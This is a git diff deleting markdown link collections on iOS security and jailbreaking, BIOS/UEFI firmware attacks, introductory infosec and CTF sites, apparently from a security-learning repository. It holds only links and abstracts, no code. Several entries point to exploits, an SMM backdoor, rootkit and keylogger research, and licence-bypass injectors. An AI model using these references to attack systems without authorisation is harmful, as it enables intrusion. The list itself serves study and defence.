-| **Center for Internet Security Guide to securing iOS 7** | https://benchmarks.cisecurity.org/tools2/iphone/CIS_Apple_iOS_7_Benchmark_v1.1.0.pdf
-| **Australian Signals Intel Guide to securing iOS 7** | http://www.asd.gov.au/publications/iOS7_Hardening_Guide.pdf
-| **Excellent forum post detailing general security practices** | https://forum.raymond.cc/threads/hardening-apple-ios-iphone-ipad-ipod.37451/
-| **Guide to hardening iOS with the goal of privacy** | http://cydia.radare.org/sec/
-
-### <a name="vuln">Vulnerabilities/Exploits</a>
-
-[List of iOS Exploits](http://theiphonewiki.com/wiki/Category:Exploits)
-
-
-### <a name="tech">Techniques</a>
-| Title     | Link |
-| -------- | ------------------------ |
-
-
-### <a name="train">Training & Tutorials</a>
-
-[iOSRE](https://github.com/kpwn/iOSRE)
-* The aim of this project is to provide useful and updated tools and knowledge on iOS reverse engineering and exploitation. This is an ongoing effort, and still in a very new stage.
-
-[OWASP iOS crackme tutorial: Solved with Frida](https://www.nowsecure.com/blog/2017/04/27/owasp-ios-crackme-tutorial-frida/)
-
-
-| Title     | Link |
-| -------- | ------------------------ |
-| **Bypassing SSL Cert Pinning in iOS** | http://chargen.matasano.com/chargen/2015/1/6/bypassing-openssl-certificate-pinning-in-ios-apps.html
-| **Learning iOS Application Security - 34 part series - damnvulnerableiosapp** | http://damnvulnerableiosapp.com/#learn
-| **iOS app designed to be vulnerable in specific ways to teach security testing of iOS applications.
-| **Damn Vulnerable iOS App - Getting Started** | http://damnvulnerableiosapp.com/2013/12/get-started/
-| **OWASP iGOAT** - “iGoat is a safe environment where iOS developers can learn about the major security pitfalls they face as well as how to avoid them. It is made up of a series of lessons that each teach a single (but vital) security lesson.” | https://www.owasp.org/index.php/OWASP_iGoat_Project
-	
-
-
-
-
-
-
-
-
-### <a name="test">iOS Security Testing Methodologies/Tools</a>
-
-| Title     | Link |
-| -------- | ------------------------ |
-| **iPwn Apps: Pentesting iOS Applications - SANS** | https://www.sans.org/reading-room/whitepapers/testing/ipwn-apps-pentesting-ios-applications-34577
-
-| **iOS Application Security Testing Cheat Sheet** | https://www.owasp.org/index.php/IOS_Application_Security_Testing_Cheat_Sheet
-| **idb** - idb is a tool to simplify some common tasks for iOS pentesting and research. It is still a work in progress but already provides a bunch of (hopefully) useful commands. The goal was to provide all (or most) functionality for both, iDevices and the iOS simulator. For this, a lot is abstracted internally to make it work transparently for both environments. Although recently the focus has been more on supporting devices. | https://github.com/dmayer/idb
-| **idb project page** | http://cysec.org/blog/2014/01/23/idb-ios-research-slash-pentesting-tool/)
-| **idb - iOS Blackbox Pentesting - Daniel A Meyer** | http://matasano.com/research/Introducing_idb_-_Simplified_Blackbox_iOS_App_Pentesting.pdf
-| **idb github page** | https://github.com/dmayer/idb
-
-[needle](https://github.com/mwrlabs/needle)
-* Needle is an open source, modular framework to streamline the process of conducting security assessments of iOS apps.
-
-
-
-
-
-
-### <a name="papers">General Research Papers</a>
-| Title     | Link |
-| -------- | ------------------------ |
-
-[Write-up for alloc8: untethered bootrom exploit for iPhone 3GS](https://github.com/axi0mX/alloc8)
-
-
-
-
-
-
-
-
-
-### <a name="re">Reverse Engineering</a>
-| Title     | Link |
-| -------- | ------------------------ |
-| **IODIDE - The IOS Debugger and Integrated Disassembler Environment** | https://github.com/nccgroup/IODIDE
-| **Clutch** - Fast iOS executable dumper | https://github.com/KJCracks/Clutch
-| **MEMSCAN - Dump iPhone app RAM** - A Cigital consultant – Grant Douglas, recently created a utility called MEMSCAN which enables users to dump the memory contents of a given iPhone app. Dumping the memory contents of a process proves to be a useful technique in identifying keys and credentials in memory. Using the utility, users are able to recover keys or secrets that are statically protected within the application but are less protected at runtime. Users can also use the utility to verify that keys and credentials are appropriately disposed of after use. | http://www.cigital.com/justice-league-blog/2015/02/18/memscan-defined/
-| **MEMSCAN - A memory scanning tool which uses mach_vm* to either dump memory or look for a specific sequence of bytes. | https://github.com/hexploitable/MEMSCAN
-| **IOS Reverse Engineering toolkit** | https://github.com/S3Jensen/iRET
-
-
-
-
-
-
-
-
-
-
-
-### <a name="jail">Jailbreaking</a>
-| Title     | Link |
-| -------- | ------------------------ |
-| **Guide to hardening iOS with the goal of privacy** | http://cydia.radare.org/sec/
-| **IPhoneDevWiki** - “Our goal is to share the sum of all human[1] knowledge about jailbroken iOS development. In other words, this is a collection of documentation written by developers to help each other write extensions (tweaks) for jailbroken iOS, and you're invited to learn from it and contribute to it too.”| http://iphonedevwiki.net/index.php/Main_Page 
-| The iPhone Wiki** - The iPhone Wiki is an unofficial wiki dedicated to collecting, storing and providing information on the internals of Apple's amazing iDevices. We hope to pass this information on to the next generation of hackers so that they can go forth into their forebears' footsteps and break the ridiculous bonds Apple has put on their amazing mobile devices. | http://theiphonewiki.com/wiki/Main_Page 
-| **OWASP Jailbreaking Cheat Sheet** | https://www.owasp.org/index.php/Mobile_Jailbreaking_Cheat_Sheet
-
-[ipwndfu](https://github.com/axi0mX/ipwndfu)
-* open-source jailbreaking tool for older iOS devices
-
-
-
-
-
-
-### <a name="dev">iOS Development</a>
-| Title     | Link |
-| -------- | ------------------------ |
-| **imas** - Defense for your iOS app - for developers | https://project-imas.github.io/
-
-
-
-### Tools
-
-[Idb](https://github.com/dmayer/idb)
-* idb is a tool to simplify some common tasks for iOS pentesting and research
-
-
-### Writeups
-
-[Write-up for alloc8: untethered bootrom exploit for iPhone 3GS](https://github.com/axi0mX/alloc8)
\ No newline at end of file
diff --git a/Draft/BIOS UEFI Attacks Defenses.md b/Draft/BIOS UEFI Attacks Defenses.md
deleted file mode 100755
index 51985a5..0000000
--- a/Draft/BIOS UEFI Attacks Defenses.md	
+++ /dev/null
@@ -1,186 +0,0 @@
-
-# Low Level Attacks/Firmware/BIOS/UEFI
-
-
-
-
-
-TOC
-* [General](#general)
-* [Exploitation](#exploit)
-* [Firmware Analysis](#firmware)
-* [Talks & Presentations](#talks)
-* [Tools](#tools)
-* [Papers & Writeups](#papers)
-* [Other](#other)
-
-
-
-
-
-#### Sort
-http://www.stoned-vienna.com/
-
-
-
- 
-
-#### End Sort
-
-
-
-----------------
-### What is This Stuff?
-* [Official UEFI Site - Specs](http://www.uefi.org/specsandtesttools)
-* [UEFI - OSDev Wiki](http://wiki.osdev.org/UEFI)
-* [Extensible Firmware Interface (EFI) and Unified EFI (UEFI)](http://www.intel.com/content/www/us/en/architecture-and-technology/unified-extensible-firmware-interface/efi-homepage-general-technology.html)
-* [Understanding AMT, UEFI BIOS and Secure boot relationships](https://communities.intel.com/community/itpeernetwork/vproexpert/blog/2013/08/11/understanding-amt-uefi-bios-and-secure-boot-relationships)
-* [Introduction to UEFI](http://x86asm.net/articles/introduction-to-uefi/)
-* [What is Intel Mangement Engine?](http://me.bios.io/ME:About)
-
-
-
------------------
-### <a name="general">General</a>
-* [Timeline of Low level software and hardware attack papers](http://timeglider.com/timeline/5ca2daa6078caaf4)
-* [Technical Overview of Windows UEFI Startup Process](http://news.saferbytes.it/analisi/2013/10/windows-uefi-startup-a-technical-overview/)
-* [Windows UEFI startup – A technical overview](http://news.saferbytes.it/analisi/2013/10/windows-uefi-startup-a-technical-overview/)
-	* Through this analysis paper we’ll give a look at Windows 8 (and 8.1) UEFI startup mechanisms and we’ll try to understand their relationship with the underlying hardware platform.
-* [Intel ME (Manageability engine) Huffman algorithm](http://io.smashthestack.org/me/)
-* [LEGBACORE Research/Publicatoins](http://www.legbacore.com/Research.html)
-* [Dr Sergei Skorobogatov - Researcher in hardware based attacks, good stuff](https://www.cl.cam.ac.uk/~sps32/)
-* [Disabling Intel ME 11 via undocumented mode - ptsecurity](http://blog.ptsecurity.com/2017/08/disabling-intel-me.html)
-* [Advanced Threat Research - Intel](http://www.intelsecurity.com/advanced-threat-research/index.html)
-
-
-
------------------
-## <a name="exploit"></a>Exploitation
-* [CHIPSEC module that exploits UEFI boot script table vulnerability](https://github.com/Cr4sh/UEFI_boot_script_expl)
-[System Management Mode Hack Using SMM for "Other Purposes](http://phrack.org/issues/65/7.html))
-	* The research provided in this paper describes in details how to reverse engineer and modify System Management Interrupt (SMI) handlers in the BIOS system firmware and how to implement and detect SMM keystroke logger. This work also presents proof of concept code of SMM keystroke logger that uses I/O Trap based keystroke interception and a code for detection of such keystroke logger.
-* [A Real SMM Rootkit: Reversing and Hooking BIOS SMI Handlers - Filip Wecherowski](http://phrack.org/issues/66/11.html#article)
-	* The research provided in this paper describes in details how to reverse engineer and modify System Management Interrupt (SMI) handlers in the BIOS system firmware and how to implement and detect SMM keystroke logger. This work also presents proof of concept code of SMM keystroke logger that uses I/O Trap based keystroke interception and a code for detection of such keystroke logger.
-* [Exploiting UEFI boot script table vulnerability](http://blog.cr4.sh/2015/02/exploiting-uefi-boot-script-table.html)
-* [Attacking Intel ® Trusted Execution Technology Rafal Wojtczuk and Joanna Rutkowska](https://www.blackhat.com/presentations/bh-dc-09/Wojtczuk_Rutkowska/BlackHat-DC-09-Rutkowska-Attacking-Intel-TXT-slides.pdf)
-* [Attacking UEFI Boot Script](https://frab.cccv.de/system/attachments/2566/original/venamis_whitepaper.pdf)
-	* Abstract—UEFI Boot Script is a data structure interpreted by UEFI firmware during S3 resume. We show that on many systems, an attacker with ring0 privileges can alter this data structure. As a result, by forcing S3 suspend/resume cycle, an attacker can run arbitrary code on a platform that is not yet fully locked. The consequences include ability to overwrite the flash storage and take control over SMM.
-* [Breaking IPMI/BMC](http://fish2.com/ipmi/how-to-break-stuff.html)
-* [20 Ways Past Secure Boot - Job de Haas - Troopers14](https://www.youtube.com/watch?v=74SzIe9qiM8)
-* [Building reliable SMM backdoor for UEFI based platforms](http://blog.cr4.sh/2015/07/building-reliable-smm-backdoor-for-uefi.html)
-* [ThinkPwn](https://github.com/Cr4sh/ThinkPwn)
-	* Lenovo ThinkPad System Management Mode arbitrary code execution exploit
-* [From SMM to userland in a few bytes](https://scumjr.github.io/2016/01/10/from-smm-to-userland-in-a-few-bytes/)
-* [Getting Physical: Extreme abuse of Intel based Paging Systems - Part 1](https://blog.coresecurity.com/2016/05/10/getting-physical-extreme-abuse-of-intel-based-paging-systems-part-1/)
-
-
-
-------------------------
-### <a name="firmware"></a>Firmware Analysis
-* [An Introduction to Firmware Analysis[30c3](https://www.youtube.com/watch?v=kvfP7StmFxY)
-	* This talk gives an introduction to firmware analysis: It starts with how to retrieve the binary, e.g. get a plain file from manufacturer, extract it from an executable or memory device, or even sniff it out of an update process or internal CPU memory, which can be really tricky. After that it introduces the necessary tools, gives tips on how to detect the processor architecture, and explains some more advanced analysis techniques, including how to figure out the offsets where the firmware is loaded to, and how to start the investigation.
-* [Analyzing and Running binaries from Firmware Images - Part 1](http://w00tsec.blogspot.com.br/2013/09/analyzing-and-running-binaries-from.html)
-* [Binwalk](https://github.com/devttys0/binwalk)
-	* Binwalk is a fast, easy to use tool for analyzing, reverse engineering, and extracting firmware images.
-* [SIMET Box Firmware Analysis: Embedded Device Hacking & Forensics](http://w00tsec.blogspot.com.br/2013/08/simet-box-firmware-analysis-embedded.html)
-* [hw0lat_detector](http://ftp.dei.uc.pt/pub/linux/kernel/people/jcm/hwlat_detector/hwlat-detector-1.0.0.patch)
-	* A system hardware latency detector Linux Kernel Module. This patch introduces a new hardware latency detector module that can be used to detect high hardware-induced latencies within the system. It was originally written for use in the RT kernel, but has wider applications.
-Reverse Engineering Router Firmware walk through
-
-* Reverse Engineering Router Firmware Writeup - secforce
-	* [Part 1](http://www.secforce.com/blog/2014/04/reverse-engineer-router-firmware-part-1/)
-	* [Part 2](http://www.secforce.com/blog/2014/07/reverse-engineer-router-firmware-part-2/)
-* [Debug Methodology Under UEFI](http://www.uefi.org/sites/default/files/resources/UEFI_Plugfest_2011Q4_P8_PHX.pdf)
-* [Reverse Engineering UEFI Firmware](https://jbeekman.nl/blog/2015/03/reverse-engineering-uefi-firmware/)
-* [Intel® System Studio – UEFI BIOS Debugging](https://software.intel.com/en-us/articles/intel-system-studio-2014-uefi-bios-debugging)
-* [Debug SPI BIOS after Power Up Sequence](https://software.intel.com/en-us/articles/debug-spi-bios-after-power-up-sequence)
-* [me-tools](https://github.com/skochinsky/me-tools)
-	* Tools for working with Intel ME
-
-
-
-
-
-
-
-
-
-----------------------
-### <a name="programming"></a>Programming
-* [UEFI Programming - First Steps](http://x86asm.net/articles/uefi-programming-first-steps/)
-
-
-
-
-
-
-
------------------
-### <a name="talks"></a>Talks & Presentations
-* [BIOS Chronomancy: Fixing the Core Root of Trust for Measurement - BlackHat 2013](https://www.youtube.com/watch?v=NbYZ4UCN9GY)
-* [Hacking Measured Boot and UEFI - Defcon20](https://www.youtube.com/watch?v=oiqcog1sk2E)
-	* There's been a lot buzz about UEFI Secure Booting, and the ability of hardware and software manufacturers to lock out third-party loaders (and rootkits). Even the NSA has been advocating the adoption of measured boot and hardware-based integrity checks. But what does this trend mean to the open source and hacker communities? In this talk I'll demonstrate measured boot in action. I'll also be releasing my new Measured Boot Tool which allows you to view Trusted Platform Module (TPM) boot data and identify risks such as unsigned early-boot drivers. And, I'll demonstrate how measured boot is used for remote device authentication. Finally, I'll discuss weaknesses in the system (hint: bootstrapping trust is still hard), what this technology means to the consumerization trend in IT, and what software and services gaps exist in this space for aspiring entrepreneurs.
-* [Hardware Backdooring is Practical -Jonathan Brossard](https://www.youtube.com/watch?v=umBruM-wFUw)
-* [Attacking “secure” chips](https://www.youtube.com/watch?v=w7PT0nrK2BE)
-* [Attackin the TPM part 2](https://www.youtube.com/watch?v=h-hohCfo4LA)
-* [Breaking apple touchID cheaply](http://www.ccc.de/en/updates/2013/ccc-breaks-apple-touchid)
-* [Attacks on UEFI Security - Rafal Wojtczuk&Corey Kallenberg](https://bromiumlabs.files.wordpress.com/2015/01/attacksonuefi_slides.pdf)
-* [The Empire Strikes Back Apple – how your Mac firmware security is completely broken](https://reverse.put.as/2015/05/29/the-empire-strikes-back-apple-how-your-mac-firmware-security-is-completely-broken/)
-	* Writeup on compromise of UEFI on apple hardware.
-* [Bootkit Threats: In Depth Reverse Engineering & Defense- Eugene Rodionov&Aleksandr Matrosov](https://www.eset.com/fileadmin/Images/US/Docs/Business/presentations/conference_papers/REcon2012.pdf)
-* [Attacks on UEFI security, inspired by Darth Venamis's misery and Speed Racer](https://media.ccc.de/browse/congress/2014/31c3_-_6129_-_en_-_saal_2_-_201412282030_-_attacks_on_uefi_security_inspired_by_darth_venamis_s_misery_and_speed_racer_-_rafal_wojtczuk_-_corey_kallenberg.html#video)
-	* On modern Intel based computers there exists two powerful and protected code regions: the UEFI firmware and System Management Mode (SMM). UEFI is the replacement for conventional BIOS and has the responsibility of initializing the platform. SMM is a powerful mode of execution on Intel CPUs that is even more privileged than a hypervisor. Because of their powerful positions, SMM and UEFI are protected by a variety of hardware mechanisms. In this talk, Rafal Wojtczuk and Corey Kallenberg team up to disclose several prevalent vulnerabilities that result in SMM runtime breakin as well as arbitrary reflash of the UEFI firmware. 
-* [Attacking and Defending BIOS in 2015](http://www.intelsecurity.com/advanced-threat-research/content/AttackingAndDefendingBIOS-RECon2015.pdf)
-* [CansecWest2016 Getting Physical: Extreme Abuse of Intel Based Paging Systems](https://github.com/n3k/CansecWest2016_Getting_Physical_Extreme_Abuse_of_Intel_Based_Paging_Systems)
-* [Stoned Bootkit - BH USA09](https://www.blackhat.com/presentations/bh-usa-09/KLEISSNER/BHUSA09-Kleissner-StonedBootkit-SLIDES.pdf)
-* [Attacking Intel BIOS - BHUSA09](https://www.blackhat.com/presentations/bh-usa-09/WOJTCZUK/BHUSA09-Wojtczuk-AtkIntelBios-SLIDES.pdf)
-* [#root via SMS: 4G access level security assessment](https://conference.hitb.org/hitbsecconf2015ams/materials/D1T1%20-%20T.%20Yunusov%20K.%20Nesterov%20-%20Bootkit%20via%20SMS.pdf)
-* [Using Intel TXT to Attack BIOSes](https://vimeo.com/117156508)
-* [Detecting BadBIOS, Evil Maids, Bootkits and Other Firmware Malware - Paul English and Lee Fisher](https://archive.org/details/seagl-2017)
-	* For attackers, platform firmware is the new Software. Most systems include hundreds of firmwares - UEFI or BIOS, PCIe expansion ROMs, USB controller drivers, storage controller host and disk/SSD drivers. Firmware-level hosted malware, bare-metal or virtualized, is nearly invisible to normal security detection tools, has full control of your system, and can often continue running even when the system is "powered off". Security Firms (eg, "Hacking Team" sell UEFI 0days to the highest bidder), and government agencies include firmware-level malware (eg, Wikileak'ed Vault7 CIA EFI malware). Defenders need to catch-up, and learn to defend their systems against firmware-level malware. In this presentation, we'll cover the NIST SP (147,147b,155,193) secure firmware guidance, for citizens, rather than vendors/enterprises. We'll discuss the problem of firmware-level malware, and cover some open source tools (FlashROM, CHIPSEC, etc.) to help detect malware on your system. We'll be discussing a new open source tool we've just released to help make it easier for you to do this check. You'll also get a nice paper tri-fold copy of our CHIPSEC Quick Reference for Sysadmins [note: we're all sysadmins for our own personal systems(!)], and some scary looking BadBIOS stickers for your laptop.
-
-
-
---------------------
-### <a name="tools"></a>Tools
-* [WindSLIC SLIC injectors](https://github.com/untermensch/WindSLIC)
-	* includes UEFI, NTFS, bootmgr SLIC injectors and installers.
-* [UEFI Firmware Parser](https://github.com/theopolis/uefi-firmware-parser)
-	* The UEFI firmware parser is a simple module and set of scripts for parsing, extracting, and recreating UEFI firmware volumes. This includes parsing modules for BIOS, OptionROM, Intel ME and other formats too. Please use the example scripts for parsing tutorials.
-* [Firmware Modifcation kit](https://code.google.com/p/firmware-mod-kit/)
-	* This kit is a collection of scripts and utilities to extract and rebuild linux based firmware images.
-* [Debug Agent Based UEFI Debugging](https://software.intel.com/en-us/articles/xdb-agent-based-uefi-debug)
-	* The Intel® System Debugger now supports non-JTAG based debug of UEFI BIOS, this requires the use of a target-side debug agent and a USB or serial connection to the debug agent. This article takes you through the steps necessary and the the debug methodology used bey the Intel® System Debugger to use this method to supplement the pure JTAG based UEFI debug method it also supports
-* [ida-uefiutils](https://github.com/snare/ida-efiutils/)
-	* Some scripts for IDA Pro to assist with reverse engineering EFI binaries 
-* [VisualUEFI](https://github.com/ionescu007/VisualUefi)
-	* A project for allowing EDK-II Development with Visual Studio
-* [UDKToolbox](https://github.com/smwikipedia/UDKToolbox)
-	* An toolbox to help adopt Visual Studio for UEFI development.
-* [Hyper-V backdoor for UEFI](https://gist.github.com/Cr4sh/55a54e7f3c113316efd2d66457df68dd)
-* [UEFITool](https://github.com/LongSoft/UEFITool)
-	* UEFITool is a cross-platform C++/Qt program for parsing, extracting and modifying UEFI firmware images. It supports parsing of full BIOS images starting with the flash descriptor or any binary files containing UEFI volumes.
-
-
-
-
------------------------
-### <a name="papers"></a>Papers & Writeups
-* [Security Evaluation of Intel's Active Management Technology](http://people.kth.se/~maguire/DEGREE-PROJECT-REPORTS/100402-Vassilios_Ververis-with-cover.pdf)
-* [Easily create UEFI applications using Visual Studio 2013](http://pete.akeo.ie/2015/01/easily-create-uefi-applications-using.html]
-* [SMM Rootkits:A New Breed of OS Independent Malware](http://www.eecs.ucf.edu/~czou/research/SMM-Rootkits-Securecom08.pdf)
-	* The emergence of hardware virtualization technology has led to the development of OS independent malware such as the Virtual Machine based rootkits (VMBRs). In this paper, we draw attention to a different but related threat that exists on many commodity systems in operation today: The System Management Mode based rootkit (SMBR). System Management Mode (SMM) is a relatively obscure mode on Intel processors used for low-level hardware control. It has its own private memory space and execution environment which is generally invisible to code running outside (e.g., the Operating System). Furthermore, SMM code is completely non-preemptible, lacks any concept of privilege level, and is immune to memory protection mechanisms. These features make it a potentially attractive home for stealthy rootkits. In this paper, we present our development of a proof of concept SMM rootkit. In it, we explore the potential of System Management Mode for malicious use by implementing a chipset level keylogger and a network backdoor capable of directly interacting with the network card to send logged keystrokes to a remote machine via UDP. The rootkit hides its memory footprint and requires no changes to the existing Operating System. It is compared and contrasted with VMBRs. Finally, techniques to defend against these threats are explored. By taking an offensive perspective we hope to help security researchers better understand the depth and scope of the problems posed by an emerging class of OS independent malware. 
-* [How to develop your own Boot Loader](https://www.codeproject.com/Articles/36907/How-to-develop-your-own-Boot-Loader)
-* [Disabling Intel ME 11 via undocumented mode - ptsecurity](http://blog.ptsecurity.com/2017/08/disabling-intel-me.html)
-
-
-
-
--------------
-### <a name="other"></a>Other
-* [Notes on Intel Microcode Updates](http://hireme.geek.nz/Intel_x86_NSA_Microcode_Updates.pdf)
-* [BIOS Mods - mydigitallife](https://forums.mydigitallife.net/forums/bios-mods.25/)
-* [MDL Projects and Applications](https://forums.mydigitallife.net/forums/mdl-projects-and-applications.34/)
-* [Advice for writing a Bootloader? - reddit](https://www.reddit.com/r/lowlevel/comments/30toah/advices_for_a_bootloader/)
-
-
diff --git a/Draft/Basic Security Information.md b/Draft/Basic Security Information.md
deleted file mode 100755
index 0066332..0000000
--- a/Draft/Basic Security Information.md	
+++ /dev/null
@@ -1,70 +0,0 @@
-## Basic Security Principles/Information
-
-
-
-
-### Basic Information
-
-These are links to basic technically  links or things I feel might help someone new to the field.
-| Title     | Link |
-| -------- | ------------------------ |
-
-
-[Infosec Tools of the Trade: Getting Your Hands Dirty](http://www.irongeek.com/i.php?page=videos/bsidesnashville2017/bsides-nashville-2017-green00-infosec-tools-of-the-trade-getting-your-hands-dirty-jason-smith-and-tara-wink)
-* In this presentation we'll will be going over introductions to the various focuses in information security and demoing the most common tools that are used in operational security, both offense and defense. You'll leave with an idea on how to freely obtain and use these tools so that you can have what you need for that first interview: experience and a passion for security. This is a green talk for people who don't have a clue on what offensive and defensive people do operationally, from a tool perspective.
-
-[So you think you want to be a penetration tester - Defcon24](https://www.youtube.com/watch?v=be7bvZkgFmY)
-* So, you think you want to be a penetration tester, or you already are and don't understand what the difference between you and all the other "so called" penetration testers out there. Think you know the difference between a Red Team, Penetration Test and a Vulnerability assessment? Know how to write a report your clients will actually read and understand? Can you leverage the strengths of your team mates to get through tough roadblocks, migrate, pivot, pwn and pillage? No? well this talk is probably for you then! We will go through the fascinating, intense and often crazily boring on-site assessment process. Talk about planning and performing Red Teams, how they are different, and why they can be super effective and have some fun along the way. I'll tell you stories that will melt your face, brain and everything in between. Give you the answers to all of your questions you never knew you had, and probably make you question your life choices. By the end of this session you will be ready to take your next steps into the job you've always wanted, or know deep inside that you should probably look for something else. There will be no judgment or shame, only information, laughter and fun.
-
-
-### General
-| Title | Link
-| -------- | --------- |
-| 'Types of Authentication' |  http://www.gfi.com/blog/security-101-authentication-part-2/ |
-|Information Security For Journalist book - Centre for Investigative Journalism| http://files.gendo.nl/Books/InfoSec_for_Journalists_V1.1.pdf |
-| Access control best practices |  https://srlabs.de/acs/  | 
-|  Programming Sucks  |  http://www.stilldrinking.org/programming-sucks  |
-
-
-### Metasploit
-| Title | Link
-| -------- | --------- |
-|  Introduction To Metasploit – The Basics |  http://www.elithecomputerguy.com/2013/02/08/introduction-to-metasploit-the-basics/  |
-
-
-
-### Shodan
-| Title | Link
-| -------- | --------- |
-|  Shodan Man page  |  http://www.shodanhq.com/help  |
-|  Shodan Filter Reference  |  http://www.shodanhq.com/help/filters  |
-|  Shodan FAQ  |  http://www.shodanhq.com/help/faq  |
-
-
-### I'll sort later
-
-
-[304 Hold my Red Bull Undergraduate Red Teaming Jonathan Gaines](https://www.youtube.com/watch?v=9vgpqRzuvLk)
-
-[100 OWASP Top 10 Hacking Web Applications with Burp Suite Chad Furman](https://www.youtube.com/watch?v=2p6twRRXK_o)
-
-[213 How not to Infosec Dan Tentler](https://www.youtube.com/watch?v=S5O47gemMNQ)
-
-[Application Whitelisting Using Microsoft AppLocker](https://www.iad.gov/iad/library/ia-guidance/tech-briefs/application-whitelisting-using-microsoft-applocker.cfm)
-
-[So You Want To Be A H6x0r Getting Started in Cybersecurity Doug White and Russ Beauchemin ](https://www.youtube.com/watch?v=rRJKghTTics)
-
-[How to become a pentester - Corelan](https://www.corelan.be/index.php/2015/10/13/how-to-become-a-pentester/)
-
-[SANS Institute Security Consensus Operational Readiness Evaluation](https://www.sans.org/media/score/checklists/LinuxCheatsheet_2.pdf)
-
-
-[Windows Commands Abused by Attackers](http://blog.jpcert.or.jp/2016/01/windows-commands-abused-by-attackers.html)
-
-[Red Hat Enterprise Linux 6 Security Guide](https://access.redhat.com/documentation/en-US/Red_Hat_Enterprise_Linux/6/pdf/Security_Guide/Red_Hat_Enterprise_Linux-6-Security_Guide-en-US.pdf)
-
-[Mitigate threats by using Windows 10 security features](https://docs.microsoft.com/en-us/windows/threat-protection/overview-of-threat-mitigations-in-windows-10)
-
-https://github.com/iadgov/Pass-the-Hash-Guidance
-
-https://blog.zsec.uk/101-intro/
\ No newline at end of file
diff --git a/Draft/CTFs_Wargames.md b/Draft/CTFs_Wargames.md
deleted file mode 100755
index 2bf346a..0000000
--- a/Draft/CTFs_Wargames.md
+++ /dev/null
@@ -1,113 +0,0 @@
-## CTFs & Wargames
-
-##### TOC
-* [General](#general)
-* [Wargames](#wargames)
-* [Vulnerable VMs](#vulnvm)
-* [Challenge Sites](#challenge)
-* [One-off Challenges & Puzzles](#puzzle)
-* [Hosting CTFs/Making your own](#make)
-
-
-#### Cull
-
-
-[Greenhorn](https://github.com/trailofbits/greenhorn)
-* Greenhorn is a Windows Pwnable released during CSAW Quals 2014. It's meant to be an introduction to modern Windows binary exploitation.
-
-
-sec-gen
-
-pentestit
-
-pentestlab
-
-root-me
-#### end cull
-
------
-### <a name="general">General</a>
-General
-* [ctf-time](https://ctftime.org/)
-* 101
-	* [How to play your first OpenCTF](http://www.openctf.com/html/firstctf.html)
-	* [Capture The Flag (CTF): What Is It for a Newbie?](https://www.alienvault.com/blogs/security-essentials/capture-the-flag-ctf-what-is-it-for-a-newbie)
-	* [Advice for my first CTF? - Reddit Thread](https://www.reddit.com/r/hacking/comments/24py5h/advice_for_my_first_ctf/)
-* Beginner Focused CTFs
-* Challenge Archives
-	* [Archive of recent CTFs](http://repo.shell-storm.org/CTF/)
-* Challenges (one-offs)
-	* [Forensics Contest](http://forensicscontest.com/)
-	* [List of themed Hacker challenges](http://counterhack.net/Counter_Hack/Challenges.html)
-	* [Sans Community Forensics Challenges](https://www.digital-forensics.sans.org/community/challenges)
-* Challenge Sites
-	* [HacktheBox.eu](https://www.hackthebox.eu/)
-	* [Wechall](http://wechall.net/)
-		* An amazing site. Tracks, lists, scores, various challenge sites. If you?re looking for a challenge or two, and not a wargame, this is the site you want to hit up first.
-	* [XSS Challenge Wiki](https://github.com/cure53/xss-challenge-wiki/wiki)
-		* A wiki that contains various xss challenges.
-	* [Halls of Valhalla](http://halls-of-valhalla.org/beta/challenges)
-	* [EnigmaGroup](http://www.enigmagroup.org/)
-	* [cmdchallenge](https://github.com/jarv/cmdchallenge)
-		* This repo holds the challenges for cmdchallenge.co - command-line challenges - can add your own/modify existing challenges
-	* [Canyouhackit](http://canyouhack.it/)
-		* Can You Hack It is a Hacking Challenge site designed to not only allow you to test and improve your skills in a wide variety of categories but to socialise both on the forums and on our IRC channel with other security enthusiasts. 
-	* [Tasteless](http://chall.tasteless.se/)
-	* [Hack This](https://www.hackthis.co.uk/)
-	* [XSS Challenge Wiki](https://github.com/cure53/xss-challenge-wiki/wiki)
-		* [List without spoilers:](https://github.com/cure53/xss-challenge-wiki/wiki/Older-Challenges-and-Write-Ups)
-* Educational
-	* [Suggestions on Running a CTF](https://github.com/pwning/docs/blob/master/suggestions-for-running-a-ctf.markdown)
-		* This document describes some of the design decisions and technical details involved in running a CTF competition. It attempts to summarize some opinions held by the CTF community and list some specific pitfalls to avoid when designing problems.
-	* [The Many Maxims of Maximally Effective CTFs](http://captf.com/maxims.html)
-* General
-	* [CTF Field Guide - TrailofBits](https://trailofbits.github.io/ctf/)
-	* [Golden Flag CTF Awards](http://golden-flags.com/)
-* Handy Tools
-	* [pngcheck](http://www.libpng.org/pub/png/apps/pngcheck.html)
-		* pngcheck verifies the integrity of PNG, JNG and MNG files (by checking the internal 32-bit CRCs [checksums] and decompressing the image data); it can optionally dump almost all of the chunk-level information in the image in human-readable form. For example, it can be used to print the basic statistics about an image (dimensions, bit depth, etc.); to list the color and transparency info in its palette (assuming it has one); or to extract the embedded text annotations. This is a command-line program with batch capabilities.
-	* [pwntools](https://github.com/Gallopsled/pwntools)
-	* [CTF Scripts and PyInstaller (.py > .exe) ](http://www.primalsecurity.net/ctf-scripts-and-pyinstaller-py-exe/)
-* Making Your Own CTF
-	* [AppJailLauncher](https://github.com/trailofbits/AppJailLauncher)
-		* CTF Challenge Framework for Windows 8 and above 
-	* [CTFd](https://github.com/isislab/CTFd)
-		* CTFd is a CTF in a can. Easily modifiable and has everything you need to run a jeopardy style CTF.
-	* [iCTF Framwork](https://github.com/ucsb-seclab/ictf-framework)
-		* This is the framework that the UC Santa Barbara Seclab uses to host the iCTF, and that can be used to create your own CTFs at http://ictf.cs.ucsb.edu/framework. The framework creates several VMs: one for the organizers and one for every team. 
-	* [NightShade](https://github.com/UnrealAkama/NightShade)
-		* NightShade is a simple security capture the flag framework that is designed to make running your own contest as easy as possible.
-	* [Mellivora](https://github.com/Nakiami/mellivora)
-		* Mellivora is a CTF engine written in PHP
-	* [SecGen](https://github.com/SecGen/SecGen)
-		* SecGen creates vulnerable virtual machines so students can learn security penetration testing techniques.
-* Vulnerable Virtual Machines
-	* [Vulnhub](https://www.Vulnhub.com)
-	* [The Hacker Games](http://www.scriptjunkie.us/2012/04/the-hacker-games/)
-		* VM Setup to practice VM breakouts/defense. Hack the VM before it hacks you!
-		* [VM Download](http://www.scriptjunkie.us/files/TheHackerGames.zip)
-	* [VulnInjector](https://github.com/g0tmi1k/VulnInjector)
-		* Generates a 'vulnerable' machine using the end users own setup files & product keys. 
-* Wargames
-	* [Ringzer0 team CTF](http://ringzer0team.com/)
